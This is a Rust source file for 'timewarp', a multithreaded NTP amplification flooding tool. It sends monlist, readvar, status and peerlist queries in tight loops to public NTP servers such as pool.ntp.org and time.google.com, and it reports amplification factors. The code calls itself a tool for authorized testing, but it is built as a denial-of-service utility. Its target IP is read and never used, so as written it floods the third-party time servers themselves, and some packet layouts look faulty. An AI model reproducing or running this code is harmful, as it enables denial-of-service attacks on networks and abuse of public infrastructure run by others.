use clap::Parser;
use colored::Colorize;
use std::fs::File;
use std::io::{self, BufRead, Write};
use std::net::{IpAddr, SocketAddr, ToSocketAddrs, UdpSocket};
use std::sync::Arc;
use std::thread;
use std::time::Duration;
use tokio::time::sleep;
use tracing::{info, warn};

const VERSION: &str = "10.21.2092vproAlpha";

/// Command-line arguments for NTP amplification testing
#[derive(Parser, Clone)]
#[command(name = "timewarp")]
#[command(about = "NTP amplification testing tool for authorized security assessment")]
struct CliArgs {
    /// Target IP address for testing
    #[arg(short = 't', long)]
    target: Option<String>,
    
    /// File containing list of NTP servers
    #[arg(short = 'n', long, default_value = "ntp_servers.txt")]
    ntp_servers: String,
    
    /// Number of concurrent threads
    #[arg(short = 'T', long, default_value = "300")]
    threads: usize,
    
    /// Test duration in seconds
    #[arg(short = 'd', long, default_value = "300")]
    duration: u64,
    
    /// Target port
    #[arg(short = 'p', long, default_value = "123")]
    port: u16,
    
    /// Enable advanced amplification techniques
    #[arg(long)]
    advanced: bool,
    
    /// Query interval in milliseconds
    #[arg(long, default_value = "5")]
    interval: u64,
    
    /// Enable response validation
    #[arg(long)]
    validate_responses: bool,
    
    /// Maximum queries per server
    #[arg(long, default_value = "1000")]
    max_queries_per_server: usize,
}

/// Displays an animated ASCII art banner with startup sequence
fn display_animated_banner() {
    // Clear screen for clean presentation
    print!("\x1B[2J\x1B[1;1H");
    io::stdout().flush().unwrap();
    
    thread::sleep(Duration::from_millis(200));
    
    // ASCII art banner with animation
    let banner_lines = vec![
        "╔═══════════════════════════════════════════════════════════════════╗",
        "║                                                                   ║",
        "║   ████████╗██╗███╗   ██╗███████╗██╗    ██╗ █████╗ ██████╗ ██████╗",
        "║   ╚══██╔══╝██║████╗  ██║██╔════╝██║    ██║██╔══██╗██╔══██╗██╔══██╗",
        "║      ██║   ██║██╔██╗ ██║█████╗  ██║ █╗ ██║███████║██████╔╝██████╔╝",
        "║      ██║   ██║██║╚██╗██║██╔══╝  ██║███╗██║██╔══██║██╔══██╗██╔═══╝",
        "║      ██║   ██║██║ ╚████║███████╗╚███╔███╔╝██║  ██║██║  ██║██║",
        "║      ╚═╝   ╚═╝╚═╝  ╚═══╝╚══════╝ ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝",
        "║                                                                   ║",
        "║              NTP AMPLIFICATION TEST FRAMEWORK                    ║",
        "║                                                                   ║",
        "╚═══════════════════════════════════════════════════════════════════╝",
    ];
    
    // Animate banner appearance with color gradient
    for (i, line) in banner_lines.iter().enumerate() {
        let colored_line = match i {
            0 | 11 => line.bright_blue().bold(),
            2..=7 => line.bright_cyan().bold(),
            9 => line.bright_yellow().bold(),
            _ => line.bright_white(),
        };
        println!("{}", colored_line);
        thread::sleep(Duration::from_millis(50));
    }
    
    println!();
    
    // Animated version and status display
    let version_text = format!("                    Version: {}", VERSION);
    print!("{}", version_text.bright_green());
    io::stdout().flush().unwrap();
    thread::sleep(Duration::from_millis(100));
    println!();
    
    let status_text = "                    Status: INITIALIZING...";
    print!("{}", status_text.bright_yellow());
    io::stdout().flush().unwrap();
    thread::sleep(Duration::from_millis(300));
    println!();
    println!();
    
    // System initialization sequence
    let init_steps = vec![
        ("Loading NTP protocol stack", 150),
        ("Initializing amplification engine", 150),
        ("Configuring packet generators", 150),
        ("Preparing worker threads", 150),
        ("System ready", 200),
    ];
    
    for (message, delay) in init_steps {
        print!("    [*] {}...", message.bright_white());
        io::stdout().flush().unwrap();
        thread::sleep(Duration::from_millis(delay));
        println!(" {}", "OK".bright_green().bold());
    }
    
    println!();
    thread::sleep(Duration::from_millis(300));
}

/// Prompts user for configuration input interactively
fn prompt_for_configuration() -> io::Result<CliArgs> {
    println!("{}", "═══════════════════════════════════════════════════════════════════".bright_cyan());
    println!("{}", "                    CONFIGURATION WIZARD".bright_yellow().bold());
    println!("{}", "═══════════════════════════════════════════════════════════════════".bright_cyan());
    println!();
    
    let mut input = String::new();
    
    // Target IP
    print!("{} ", "→ Target IP address:".bright_white().bold());
    io::stdout().flush()?;
    input.clear();
    io::stdin().read_line(&mut input)?;
    let target = Some(input.trim().to_string());
    
    // NTP servers file
    print!("{} ", "→ NTP servers file [ntp_servers.txt]:".bright_white().bold());
    io::stdout().flush()?;
    input.clear();
    io::stdin().read_line(&mut input)?;
    let ntp_servers = if input.trim().is_empty() {
        "ntp_servers.txt".to_string()
    } else {
        input.trim().to_string()
    };
    
    // Threads
    print!("{} ", "→ Number of concurrent threads [300]:".bright_white().bold());
    io::stdout().flush()?;
    input.clear();
    io::stdin().read_line(&mut input)?;
    let threads = if input.trim().is_empty() {
        300
    } else {
        input.trim().parse().unwrap_or(300)
    };
    
    // Duration
    print!("{} ", "→ Test duration in seconds [300]:".bright_white().bold());
    io::stdout().flush()?;
    input.clear();
    io::stdin().read_line(&mut input)?;
    let duration = if input.trim().is_empty() {
        300
    } else {
        input.trim().parse().unwrap_or(300)
    };
    
    // Advanced mode
    print!("{} ", "→ Enable advanced techniques? (y/n) [y]:".bright_white().bold());
    io::stdout().flush()?;
    input.clear();
    io::stdin().read_line(&mut input)?;
    let advanced = input.trim().is_empty() || input.trim().eq_ignore_ascii_case("y");
    
    println!();
    println!("{}", "Configuration complete!".bright_green().bold());
    println!();
    
    Ok(CliArgs {
        target,
        ntp_servers,
        threads,
        duration,
        port: 123,
        advanced,
        interval: 5,
        validate_responses: false,
        max_queries_per_server: 1000,
    })
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    tracing_subscriber::fmt::init();
    
    // Display animated banner
    display_animated_banner();
    
    // Check if running in interactive mode (no arguments provided)
    let config = if std::env::args().len() <= 1 {
        // Interactive mode - prompt for configuration
        prompt_for_configuration()?
    } else {
        // Command-line mode - parse arguments
        CliArgs::parse()
    };
    
    // Validate target
    let target = match &config.target {
        Some(t) => t.clone(),
        None => {
            println!("{}", "Error: Target IP address is required".bright_red().bold());
            return Ok(());
        }
    };
    
    // Display configuration summary
    println!("{}", "═══════════════════════════════════════════════════════════════════".bright_cyan());
    println!("{}", "                    TEST CONFIGURATION".bright_yellow().bold());
    println!("{}", "═══════════════════════════════════════════════════════════════════".bright_cyan());
    println!();
    println!("  {} {}", "Target IP:".bright_white().bold(), target.bright_green());
    println!("  {} {}", "NTP Servers File:".bright_white().bold(), config.ntp_servers.bright_green());
    println!("  {} {}", "Threads:".bright_white().bold(), config.threads.to_string().bright_green());
    println!("  {} {}s", "Duration:".bright_white().bold(), config.duration.to_string().bright_green());
    println!("  {} {}", "Port:".bright_white().bold(), config.port.to_string().bright_green());
    println!("  {} {}", "Advanced Mode:".bright_white().bold(), config.advanced.to_string().bright_green());
    println!("  {} {}ms", "Query Interval:".bright_white().bold(), config.interval.to_string().bright_green());
    println!("  {} {}", "Validate Responses:".bright_white().bold(), config.validate_responses.to_string().bright_green());
    println!();
    println!("{}", "═══════════════════════════════════════════════════════════════════".bright_cyan());
    println!();
    
    // Confirmation prompt
    print!("{} ", "→ Start NTP amplification test? (y/n) [y]:".bright_yellow().bold());
    io::stdout().flush()?;
    let mut confirm = String::new();
    io::stdin().read_line(&mut confirm)?;
    
    if !confirm.trim().is_empty() && !confirm.trim().eq_ignore_ascii_case("y") {
        println!("{}", "Test cancelled by user.".bright_red());
        return Ok(());
    }
    
    println!();
    
    let target_ip: IpAddr = target.parse()?;
    let ntp_servers = load_ntp_servers(&config.ntp_servers)?;
    
    info!("Loaded {} NTP servers", ntp_servers.len());
    println!("{} Loaded {} NTP servers", "[+]".bright_green(), ntp_servers.len());

    let ntp_servers = Arc::new(ntp_servers);
    
    // Use advanced mode if enabled
    if config.advanced {
        println!("{}", "[*] Starting advanced NTP amplification test...".bright_cyan().bold());
        ntp_amplification_advanced(target_ip, Arc::clone(&ntp_servers), config.duration).await?;
    } else {
        println!("{}", "[*] Starting standard NTP amplification test...".bright_cyan().bold());
        
        let mut handles = vec![];

        for i in 0..config.threads {
            let ntp_servers = Arc::clone(&ntp_servers);

            let handle = tokio::spawn(async move {
                ntp_amplification_worker(i, target_ip, config.port, ntp_servers, config.duration).await;
            });

            handles.push(handle);
        }

        for handle in handles {
            handle.await?;
        }
    }

    println!();
    println!("{}", "═══════════════════════════════════════════════════════════════════".bright_green());
    println!("{}", "                    TEST COMPLETED".bright_green().bold());
    println!("{}", "═══════════════════════════════════════════════════════════════════".bright_green());
    println!();
    println!("  {} NTP amplification test completed successfully", "[+]".bright_green().bold());
    println!();
    
    Ok(())
}

/// Worker thread for NTP amplification testing
async fn ntp_amplification_worker(
    id: usize,
    _target_ip: IpAddr,
    _target_port: u16,
    ntp_servers: Arc<Vec<IpAddr>>,
    duration: u64,
) {
    let start_time = std::time::Instant::now();
    let mut queries_sent = 0;
    let mut responses_received = 0;
    let mut total_response_bytes = 0u64;

    // Create UDP socket for sending queries
    let socket = match UdpSocket::bind("0.0.0.0:0") {
        Ok(s) => {
            // Set socket to non-blocking for response checking
            s.set_nonblocking(true).ok();
            s
        }
        Err(e) => {
            warn!("Worker {}: Failed to create socket: {}", id, e);
            return;
        }
    };

    // NTP amplification queries - using all packet types
    let amplification_queries = vec![
        ("monlist", create_ntp_monlist_packet()),
        ("readvar", create_ntp_readvar_packet()),
        ("status", create_ntp_status_packet()),
        ("peerlist", create_ntp_peerlist_packet()),
        ("client", create_ntp_client_packet()),
    ];

    let mut query_index = 0;

    while start_time.elapsed().as_secs() < duration {
        for ntp_server in ntp_servers.iter() {
            // Rotate through different query types
            let (_query_type, query) = &amplification_queries[query_index % amplification_queries.len()];
            query_index += 1;
            
            // Send NTP query to server
            let target_addr = SocketAddr::new(*ntp_server, 123);
            
            match socket.send_to(query, &target_addr) {
                Ok(_bytes_sent) => {
                    queries_sent += 1;
                    
                    // Try to receive response (non-blocking)
                    let mut response_buf = [0u8; 1024];
                    if let Ok((bytes_received, _)) = socket.recv_from(&mut response_buf) {
                        if validate_ntp_response(&response_buf[..bytes_received]) {
                            responses_received += 1;
                            total_response_bytes += bytes_received as u64;
                        }
                    }
                }
                Err(e) => {
                    if queries_sent % 1000 == 0 {
                        warn!("Worker {}: Send failed to {}: {}", id, ntp_server, e);
                    }
                }
            }
        }

        // Brief pause to avoid overwhelming local network
        sleep(Duration::from_millis(5)).await;

        if queries_sent % 500 == 0 {
            let amplification_factor = if queries_sent > 0 {
                total_response_bytes as f64 / (queries_sent * 48) as f64
            } else {
                0.0
            };
            
            info!(
                "Worker {}: Sent {} queries, Received {} responses, Amplification: {:.2}x",
                id, queries_sent, responses_received, amplification_factor
            );
        }
    }

    let final_amplification = if queries_sent > 0 {
        total_response_bytes as f64 / (queries_sent * 48) as f64
    } else {
        0.0
    };

    info!(
        "Worker {} completed. Queries: {}, Responses: {}, Total response bytes: {}, Amplification factor: {:.2}x",
        id, queries_sent, responses_received, total_response_bytes, final_amplification
    );
}

/// Loads NTP servers from file or uses defaults
fn load_ntp_servers(file_path: &str) -> Result<Vec<IpAddr>, Box<dyn std::error::Error>> {
    let mut servers = Vec::new();
    
    // Default public NTP servers if file doesn't exist
    let default_servers = vec![
        "0.pool.ntp.org",
        "1.pool.ntp.org", 
        "2.pool.ntp.org",
        "3.pool.ntp.org",
        "time.google.com",
        "time.cloudflare.com",
        "time.apple.com",
        "time.windows.com",
        "ntp.ubuntu.com",
        "ntp.centos.org",
        "pool.ntp.org",
        "us.pool.ntp.org",
        "europe.pool.ntp.org",
        "asia.pool.ntp.org",
    ];

    // Try to load from file
    match File::open(file_path) {
        Ok(file) => {
            for line in io::BufReader::new(file).lines() {
                if let Ok(ip_str) = line {
                    if let Ok(ip) = ip_str.trim().parse() {
                        servers.push(ip);
                    }
                }
            }
            info!("Loaded {} NTP servers from {}", servers.len(), file_path);
        }
        Err(_) => {
            warn!("Could not load NTP servers from {}, using defaults", file_path);
            // Resolve default server names to IPs
            for server_name in default_servers {
                if let Ok(ips) = resolve_hostname(server_name) {
                    servers.extend(ips);
                }
            }
        }
    }

    Ok(servers)
}

/// Resolves hostname to IP addresses
fn resolve_hostname(hostname: &str) -> Result<Vec<IpAddr>, Box<dyn std::error::Error>> {
    let addr_with_port = format!("{}:123", hostname);
    let addrs: Vec<SocketAddr> = addr_with_port.to_socket_addrs()?.collect();
    let ips: Vec<IpAddr> = addrs.into_iter().map(|addr| addr.ip()).collect();
    
    Ok(ips)
}

fn create_ntp_monlist_packet() -> Vec<u8> {
    // NTP monlist (command 42) packet for maximum amplification
    // This command requests the list of recent clients from the NTP server
    let mut packet = vec![0u8; 48]; // Standard NTP packet size
    
    // NTP header - Version 2, Mode 7 (private/control)
    packet[0] = 0x17; // LI=0, VN=2, Mode=7
    packet[1] = 0x00; // Response bit, Error bit, More bit, Opcode
    packet[2] = 0x03; // Sequence number
    packet[3] = 0x2a; // Implementation number
    
    // Request code for monlist
    packet[4] = 0x00;
    packet[5] = 0x00;
    packet[6] = 0x00;
    packet[7] = 0x2a; // Command 42 (monlist)
    
    // Fill rest with zeros
    for i in 8..48 {
        packet[i] = 0x00;
    }
    
    packet
}

fn create_ntp_readvar_packet() -> Vec<u8> {
    // NTP read variables packet - requests system variables
    let mut packet = vec![0u8; 48];
    
    // NTP header
    packet[0] = 0x16; // LI=0, VN=2, Mode=6
    packet[1] = 0x02; // Read variables opcode
    packet[2] = 0x00;
    packet[3] = 0x00;
    
    // Association ID (0 = system variables)
    packet[4] = 0x00;
    packet[5] = 0x00;
    
    // Variable list
    packet.extend_from_slice(b"version,processor,system,leap,stratum,precision,rootdelay\0");
    
    packet
}

fn create_ntp_status_packet() -> Vec<u8> {
    // NTP status packet - requests server status
    let mut packet = vec![0u8; 48];
    
    // NTP header
    packet[0] = 0x16; // LI=0, VN=2, Mode=6
    packet[1] = 0x01; // Read status opcode
    packet[2] = 0x00;
    packet[3] = 0x00;
    
    // Association ID
    packet[4] = 0x00;
    packet[5] = 0x00;
    
    packet
}

fn create_ntp_peerlist_packet() -> Vec<u8> {
    // NTP peer list packet - requests list of peers
    let mut packet = vec![0u8; 48];
    
    // NTP header
    packet[0] = 0x17; // LI=0, VN=2, Mode=7
    packet[1] = 0x00;
    packet[2] = 0x00;
    packet[3] = 0x00;
    
    // Request code for peer list
    packet[4] = 0x00;
    packet[5] = 0x00;
    packet[6] = 0x00;
    packet[7] = 0x01; // Command 1 (peer list)
    
    packet
}

/// Creates a standard NTP client request packet
fn create_ntp_client_packet() -> Vec<u8> {
    let mut packet = vec![0u8; 48];
    
    // Standard NTP client request
    packet[0] = 0x1b; // LI=0, VN=3, Mode=3 (client)
    
    // Set transmit timestamp to current time
    let timestamp = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_secs() + 2208988800; // NTP epoch offset
    
    // Transmit timestamp (bytes 40-47)
    packet[40] = ((timestamp >> 24) & 0xff) as u8;
    packet[41] = ((timestamp >> 16) & 0xff) as u8;
    packet[42] = ((timestamp >> 8) & 0xff) as u8;
    packet[43] = (timestamp & 0xff) as u8;
    
    packet
}

/// Validates NTP response packet
fn validate_ntp_response(response: &[u8]) -> bool {
    if response.len() < 48 {
        return false;
    }
    
    // Check if it's a valid NTP packet
    let li_vn_mode = response[0];
    let version = (li_vn_mode >> 3) & 0x07;
    let mode = li_vn_mode & 0x07;
    
    // Valid NTP versions: 1-4
    // Valid modes: 2 (server), 4 (broadcast), 5 (broadcast client)
    version >= 1 && version <= 4 && (mode == 2 || mode == 4 || mode == 5)
}

// Advanced NTP amplification techniques
async fn ntp_amplification_advanced(
    target_ip: IpAddr,
    ntp_servers: Arc<Vec<IpAddr>>,
    duration: u64,
) -> Result<(), Box<dyn std::error::Error>> {
    // Advanced NTP amplification with multiple techniques
    
    let mut handles = vec![];
    
    // Technique 1: Standard monlist amplification
    let ntp_servers1 = Arc::clone(&ntp_servers);
    let target_ip1 = target_ip;
    let handle1 = tokio::spawn(async move {
        ntp_amplification_monlist(target_ip1, ntp_servers1, duration).await;
    });
    handles.push(handle1);
    
    // Technique 2: Read variables amplification
    let ntp_servers2 = Arc::clone(&ntp_servers);
    let target_ip2 = target_ip;
    let handle2 = tokio::spawn(async move {
        ntp_amplification_readvar(target_ip2, ntp_servers2, duration).await;
    });
    handles.push(handle2);
    
    // Technique 3: Mixed NTP commands
    let ntp_servers3 = Arc::clone(&ntp_servers);
    let target_ip3 = target_ip;
    let handle3 = tokio::spawn(async move {
        ntp_amplification_mixed(target_ip3, ntp_servers3, duration).await;
    });
    handles.push(handle3);
    
    for handle in handles {
        handle.await?;
    }
    
    Ok(())
}

async fn ntp_amplification_monlist(
    _target_ip: IpAddr,
    ntp_servers: Arc<Vec<IpAddr>>,
    duration: u64,
) {
    let start_time = std::time::Instant::now();
    let mut queries_sent = 0;
    
    let socket = match UdpSocket::bind("0.0.0.0:0") {
        Ok(s) => s,
        Err(e) => {
            warn!("Monlist worker: Failed to create socket: {}", e);
            return;
        }
    };
    
    while start_time.elapsed().as_secs() < duration {
        for ntp_server in ntp_servers.iter() {
            let packet = create_ntp_monlist_packet();
            let target_addr = SocketAddr::new(*ntp_server, 123);
            
            if let Ok(_) = socket.send_to(&packet, &target_addr) {
                queries_sent += 1;
            }
        }
        
        sleep(Duration::from_millis(10)).await;
        
        if queries_sent % 100 == 0 {
            info!("Monlist worker: Sent {} queries", queries_sent);
        }
    }
    
    info!("Monlist worker completed. Total queries: {}", queries_sent);
}

async fn ntp_amplification_readvar(
    _target_ip: IpAddr,
    ntp_servers: Arc<Vec<IpAddr>>,
    duration: u64,
) {
    let start_time = std::time::Instant::now();
    let mut queries_sent = 0;
    
    let socket = match UdpSocket::bind("0.0.0.0:0") {
        Ok(s) => s,
        Err(e) => {
            warn!("Readvar worker: Failed to create socket: {}", e);
            return;
        }
    };
    
    while start_time.elapsed().as_secs() < duration {
        for ntp_server in ntp_servers.iter() {
            let packet = create_ntp_readvar_packet();
            let target_addr = SocketAddr::new(*ntp_server, 123);
            
            if let Ok(_) = socket.send_to(&packet, &target_addr) {
                queries_sent += 1;
            }
        }
        
        sleep(Duration::from_millis(15)).await;
        
        if queries_sent % 80 == 0 {
            info!("Readvar worker: Sent {} queries", queries_sent);
        }
    }
    
    info!("Readvar worker completed. Total queries: {}", queries_sent);
}

async fn ntp_amplification_mixed(
    _target_ip: IpAddr,
    ntp_servers: Arc<Vec<IpAddr>>,
    duration: u64,
) {
    let start_time = std::time::Instant::now();
    let mut queries_sent = 0;
    
    let socket = match UdpSocket::bind("0.0.0.0:0") {
        Ok(s) => s,
        Err(e) => {
            warn!("Mixed worker: Failed to create socket: {}", e);
            return;
        }
    };
    
    let mixed_packets = vec![
        create_ntp_monlist_packet(),
        create_ntp_readvar_packet(),
        create_ntp_status_packet(),
        create_ntp_peerlist_packet(),
    ];
    
    while start_time.elapsed().as_secs() < duration {
        for ntp_server in ntp_servers.iter() {
            for (i, packet) in mixed_packets.iter().enumerate() {
                let target_addr = SocketAddr::new(*ntp_server, 123);
                
                if let Ok(_) = socket.send_to(packet, &target_addr) {
                    queries_sent += 1;
                }
                
                if i % 2 == 0 {
                    sleep(Duration::from_millis(5)).await;
                }
            }
        }
        
        sleep(Duration::from_millis(20)).await;
        
        if queries_sent % 200 == 0 {
            info!("Mixed worker: Sent {} queries", queries_sent);
        }
    }
    
    info!("Mixed worker completed. Total queries: {}", queries_sent);
}
